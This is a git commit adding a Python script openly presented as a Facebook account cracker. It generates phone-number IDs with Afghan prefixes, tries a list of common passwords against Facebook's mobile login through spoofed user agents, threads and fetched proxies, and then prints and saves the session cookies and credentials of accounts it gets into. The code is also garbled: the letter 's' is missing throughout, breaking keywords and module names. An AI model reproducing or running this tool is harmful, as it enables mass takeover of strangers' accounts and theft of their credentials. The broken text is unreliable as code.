8aa168a81adf2f18108971c4ea8446566462f4d4
esadrwys <155876948+esadrwys@users.noreply.github.com>
2024-01-22 22:56:40 +0430

    Create muslim1000.py
    mr -rf muslim1000
    git clone https://github.com/esadrwys/muslim1000.git
    cd muslim1000
    git pull
    python muslim1000.py

---
+++ muslim1000.py
@@ -0,0 +1,332 @@
+#open-ource 
+#code by > Bair kh
+#Tet
+#---------------------[IMPORT]---------------------#
+from o import path
+import o,bae64,zlib,pip,urllib
+import uuid
+import o,y,time,jon,random,re,tring,platform,bae64
+try:
+    import requet
+    from concurrent.future import ThreadPoolExecutor a ThreadPool
+    import mechanize
+    from requet.exception import ConnectionError
+except ModuleNotFoundError:
+    o.ytem('pip intall mechanize requet future==2 > /dev/null')
+    o.ytem('python run.py')
+import uuid
+import o,y,time,jon,random,re,tring,platform,bae64
+try:
+###----------[ IMPORT LIBRARY ]---------- ###
+    import requet
+    from concurrent.future import ThreadPoolExecutor a ThreadPool
+    import mechanize
+    from requet.exception import ConnectionError
+except ModuleNotFoundError:
+    o.ytem('pip intall mechanize requet future==2 > /dev/null')
+    o.ytem('python run.py')
+import uuid
+import o,y,time,jon,random,re,tring,platform,bae64
+try:
+    import requet
+    from concurrent.future import ThreadPoolExecutor a ThreadPool
+    import mechanize
+    from requet.exception import ConnectionError
+except ModuleNotFoundError:
+    o.ytem('pip intall mechanize requet future==2 > /dev/null')
+    o.ytem('python run.py')
+
+cla jalan:
+    
+    def __init__(elf, z):
+        pa
+
+import o,y,time,jon,random,re,tring,platform,bae64,uuid
+from b4 import Beautifuloup a op
+from b4 import Beautifuloup
+import requet a re
+from datetime import date
+from datetime import datetime
+from time import leep
+from time import leep a waktu
+try:
+    import requet
+    from concurrent.future import ThreadPoolExecutor a ThreadPool
+    import mechanize
+    from requet.exception import ConnectionError
+except ModuleNotFoundError:
+    o.ytem('pip intall mechanize requet future b4==2 > /dev/null')
+    o.ytem('pip intall b4')
+    
+def cek_apk(eion,coki):
+    w=eion.get("http://free.facebook.com/etting/app/tabbed/?tab=active",cookie={"cookie":coki}).text
+    op = Beautifuloup(w,"html.parer")
+    x = op.find("form",method="pot")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%[%!%] %orry there i no Active  Apk%  '%(N,M,N,M,N))
+    ele:
+        print(f'\r[*] % \x1b[1;95m [ Your Active App ]     :{WHITE}'%(GREEN))
+        for i in range(len(game)):
+            print(f"\r[%%] %%"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        #ele:
+            #print(f'\r %[%!%] orry, Apk check failed invalid cookie'%(N,M,N))
+    w=eion.get("http://free.facebook.com/etting/app/tabbed/?tab=inactive",cookie={"cookie":coki}).text
+    op = Beautifuloup(w,"html.parer")
+    x = op.find("form",method="pot")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%[%!%] %orry there i no Expired Apk%           \n'%(N,M,N,M,N))
+    ele:
+        print(f'\r[*] % \x1b[1;95m [ Your Expired App ]    :{WHITE}'%(M))
+        for i in range(len(game)):
+            print(f"\r[%%] %%"%(N,i+1,game[i].replace("Kedaluwara"," Kedaluwara"),N))
+        ele:
+            print('\033[1;97m====================================================')           
+ 
+cla jalan:
+    def __init__(elf, z):
+        for e in z + "\n":
+            y.tdout.write(e)
+            y.tdout.fluh()
+            time.leep(0.009)
+            
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' #
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+A = '\x1b[1;90m' # WARNA ABU ABU
+BN = '\x1b[1;107m' # BELAKANG PUTIH
+BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
+BP = '\x1b[1;105m' # BELAKANG PINK
+BB = '\x1b[1;104m' # BELAKANG BIRU
+BK = '\x1b[1;103m' # BELAKANG KUNING
+BH = '\x1b[1;102m' # BELAKANG HIJAU
+BM = '\x1b[1;101m' # BELAJANG MERAH
+BA = '\x1b[1;100m' # BELAKANG ABU ABU
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+now = datetime.now()
+dt_tring = now.trftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+
+try:
+	prox= requet.get('http://api.proxycrape.com/v2/?requet=diplayproxie&protocol=ock4&timeout=100000&country=all&l=all&anonymity=all').text
+	open('.proxy.txt','w').write(prox)
+except Exception a e:
+	exit(e)
+
+logo ="""  \033[1;92m                                
+@@@@@@@@        @@@@@@         @@@@@@   
+@@@@@@@@       @@@@@@@        @@@@@@@@  
+@@!            !@@            @@!  @@@  
+!@!            !@!            !@!  @!@  
+@!!!:!         !!@@!!         @!@!@!@!  
+!!!!!:          !!@!!!        !!!@!!!!  
+!!:                 !:!       !!:  !!!  
+:!:       :!:      !:!   :!:  :!:  !:!  
+ :: ::::   ::  :::: ::    ::  ::   :::  
+: :: ::   ::   :: : :    ::    :   : :    \033[1;93m0.6
+\033[1;97m====================================================
+\033[1;97m[+] AUTHOR   : ESA AFG
+\033[1;97m[+] FACEBOOK : RAYE ESA
+\033[1;97m[+] TEAM     : AFGHAN ESA
+\033[1;97m[+] TATU   : \033[1;95mOPEN-OURCE
+\033[1;97m===================================================="""
+
+
+loop = 0
+ok = []
+cp = []
+ 
+ 
+def clear():
+    o.ytem('clear')
+    print(logo)
+from time import localtime a lt
+from o import ytem a cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+ele:
+    a = ltx
+    tag = "AM"
+    
+    
+def main_menu():
+    o.ytem('clear')
+    jalan(logo)
+    print('\x1b[1;37m[1] Random Crack')
+    print('\x1b[1;37m[2] Tele Channel')
+    print('\x1b[1;37m[0] \x1b[1;31mExit')
+    print('\033[1;97m====================================================')
+    bair = input('[~] Chooe option : \033[1;92m')
+    if bair == '1':
+        afg()
+    if bair == '2':
+        o.ytem('xdg-open http://t.me/Afghan_Tech_001')
+        main_menu()
+    if bair == '0':
+        exit()
+        return None
+    None('\x1b[1;37m[~] \x1b[1;32mTHANK FOR UE')
+    
+    
+try:
+    print('\033[1;97m[~]\033[1;33m LOADING AET FILE... \033[0;97m')
+    v = 5.2
+    update = ('5.2')
+    update = ('5.2')
+    if tr(v) in update:
+        o.ytem('clear')
+    ele:pa
+except:print('\033[1;97m[~]\033[1;31m NO INTERNET CONNECTION... \033[0;97m')
+#global function
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        print('\r'+text+o),
+        y.tdout.fluh();time.leep(1)
+ 
+#Uer agent
+ugen2=[]
+ugen=[]
+ 
+for xd in range(10000):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' en-u; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', '', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', '', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile afari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+    
+# APK CHECK
+def afg():
+    uer=[]
+    twf =[]
+    o.getuid
+    o.geteuid
+    o.ytem("clear")
+    print(logo)    
+    print('\033[1;97m[~] im code : \033[1;91m9378, 9379, 9377, 9370, 9374')
+    print('\033[1;97m====================================================')
+    code = input('[~] Put Code :\033[1;92m ')
+    o.ytem("clear")
+    print(logo)    
+    limit = int(input('\033[1;97m[~] Cloning limit : \033[1;91m1000, 2000, 30000, 50000\n\033[1;97m====================================================\n\033[1;97m[~] Put Limit :\033[1;92m '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(tring.digit) for _ in range(7))
+        uer.append(nmp)
+    o.ytem("clear")
+    print(logo)
+    with ThreadPool(max_worker=50) a bair:
+        clear()
+        tl = tr(len(uer))
+        print('\033[1;37m[~] TOTAL ID :\033[1;32m '+tl)
+        print('\033[1;37m[~] \033[1;33mTHE PROCE HA BEEN TARTED')
+        print('\033[1;37m[~] \033[1;31mUE AEROPLANE MOOD FOR PEED UP')
+        print('\033[1;97m====================================================')
+        for love in uer:
+            uid = code+love
+            pwx = [love,uid,'۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','afghan123','afghanitan','10002000','۱۰۰۲۰۰','100200','200300','900900','500500','700800','300400','123456','600700','300300','Afghanistan123','Afghan12345','Afghan1234','Afghanistan','khankhan','khan123','khan1234','khan12345','kabul1234','kabul12345','kobul1234','800900']
+            bair.ubmit(rdm,uid,pwx,tl)
+    print('\033[1;97m====================================================')
+    print('\033[1;37m[~] CRACK PROCE HA BEEN COMPLETED ')
+    print('\033[1;37m[~] ID AVED IN TECH OK.txt & CP.txt ')
+    print('\033[1;97m====================================================')
+    input('\033[1;37m[~] PRE ENTER TO BACK MENU')
+    main_menu()
+ 
+def rdm(uid,pwx,tl):
+    #print(uer)
+    global loop
+    global cp
+    global ok
+    global proxy
+    try:
+        for p in pwx:
+            pro = random.choice(ugen)
+            eion = requet.eion()
+            free_fb = eion.get('http://free.facebook.com').text
+            log_data = {
+                "ld":re.earch('name="ld" value="(.*?)"', tr(free_fb)).group(1),
+            "jazoet":re.earch('name="jazoet" value="(.*?)"', tr(free_fb)).group(1),
+            "m_t":re.earch('name="m_t" value="(.*?)"', tr(free_fb)).group(1),
+            "li":re.earch('name="li" value="(.*?)"', tr(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_trie":"0",
+            "email":uid,
+            "pa":p,
+            "login":"Log In"}
+            header_freefb = {"authority": 'x.facebook.com',
+            "method": 'GET',         
+            "cheme": 'http',
+            'authority': 'x.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/igned-exchange;v=b3;q=0.7',
+            'accept-language': 'fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-U;q=0.6',
+            'cache-control': 'max-age=0',
+            'dpr': '2.8125',
+            'ec-ch-prefer-color-cheme': 'dark',
+            'ec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'ec-ch-ua-full-verion-lit': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+            'ec-ch-ua-mobile': '?0',
+            'ec-ch-ua-model': '""',
+            'ec-ch-ua-platform': '"Linux"',
+            'ec-ch-ua-platform-verion': '""',
+            'ec-fetch-det': 'document',
+            'ec-fetch-mode': 'navigate',
+            'ec-fetch-ite': 'none',
+            'ec-fetch-uer': '?1',
+            'upgrade-inecure-requet': '1',
+            'viewport-width': '980',
+            "uer-agent": pro}
+            lo = eion.pot('http://x.facebook.com/login/device-baed/login/aync/',data=log_data,header=header_freefb).text
+            log_cookie=eion.cookie.get_dict().key()
+            if 'c_uer' in log_cookie:
+                coki=";".join([key+"="+value for key,value in eion.cookie.get_dict().item()])
+                cid = coki[7:22]
+                print('\033[1;32m[ESA😘-OK]  ' +uid+ ' | ' +p+'  \n\033[1;37m[] COOKIE = \033[1;32m'+coki+'  \033[0;97m')
+                cek_apk(eion,coki)
+                open('/dcard/ESA😘-OK.txt', 'a').write( cid+' | '+p+'\n')
+                ok.append(cid)
+                break
+            elif 'checkpoint' in log_cookie:
+                coki=";".join([key+"="+value for key,value in eion.cookie.get_dict().item()])
+                cid = coki[24:39]
+                print('\33[1;31m[ESA😏-CP]  ' +uid+ ' | ' +p+'  \33[0;97m')
+                open('/dcard/ESA😏-CP.txt', 'a').write( cid+' | '+p+' \n')
+                cp.append(cid)
+                break
+            ele:
+                continue
+        loop+=1
+        y.tdout.write('\r%[AFG] [%/%]  OK:- %  CP:- % \r'%(H,loop,tl,len(ok),len(cp))),
+        y.tdout.fluh()
+    except:
+        pa
+ 
+main_menu()
